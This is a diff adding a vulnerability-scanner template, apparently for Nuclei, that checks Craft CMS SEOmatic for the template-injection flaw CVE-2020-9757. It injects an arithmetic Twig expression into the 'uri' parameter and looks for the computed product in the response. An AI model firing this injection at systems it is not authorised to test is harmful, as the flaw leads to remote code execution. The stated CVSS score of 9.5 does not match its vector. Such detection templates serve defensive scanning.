@@ -1,0 +1,35 @@
+id: craftcms-seomatic-ssti
+info:
+  name: CraftCMS SEOmatic SSTI (CVE-2020-9757)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection that leads to RCE via malformed data to the metacontainers controller.
+  classification:
+    cve-id: CVE-2020-9757
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.5
+  reference:
+    - https://github.com/giany/CVE/blob/master/CVE-2020-9757.txt
+
+variables:
+  rand1: '{{rand_int(40000, 44800)}}'
+  rand2: '{{rand_int(40000, 44800)}}'
+  expected_result: '{{to_number(rand1) * to_number(rand2)}}'
+
+http:
+  - raw:
+      - |
+        GET /actions/seomatic/meta-container/meta-link-container/?uri={{url_encode(concat('{{', rand1, '*', rand2, '}}'))}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "MetaLinkContainer"
+          - "canonical"
+      - type: word
+        words:
+          - "{{expected_result}}"
+        part: body
